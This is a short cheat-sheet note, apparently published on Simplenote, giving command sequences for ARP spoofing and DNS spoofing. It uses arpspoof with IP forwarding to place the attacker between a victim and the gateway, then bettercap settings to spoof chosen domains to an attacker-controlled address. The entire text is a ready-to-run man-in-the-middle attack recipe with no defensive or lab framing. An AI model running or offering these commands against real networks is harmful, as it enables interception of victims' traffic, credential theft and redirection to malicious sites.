@@ -1,0 +1,24 @@
+
+
+DNS/ARP Spoof
+
+ARP SPOOF
+http://simp.ly/p/GYFvS4
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t victim_ip router_gateway
+arpspoof -i eth0 -t router_gateway victim_ip
+
+
+DNS SPOOF
+
+bettercap
+
+net.probe.on
+set arp.spoof.fullduplex true
+set dns.spoof.address IP_Address
+set dns.spoof.domains domain1.com sub.domain1.com
+set arpspoof.targets Victim IP
+set dns.spoof on
+Published with Simplenote
+Report abuse
